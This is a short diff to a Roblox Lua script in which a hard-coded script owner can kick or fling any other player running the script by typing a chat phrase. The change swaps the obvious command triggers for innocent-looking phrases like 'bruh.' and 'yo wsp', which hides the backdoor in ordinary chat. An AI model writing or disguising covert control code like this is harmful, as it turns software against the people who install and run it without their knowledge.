@@ -6175,7 +6175,7 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == "!ay? ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "bruh." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer:Kick("Kicked by script owner | the Sigma")
 					end)
@@ -6187,7 +6187,7 @@ task.spawn(function()
 					end)
 				end
 
-				if Message:lower() == "!lag ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "yo wsp" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
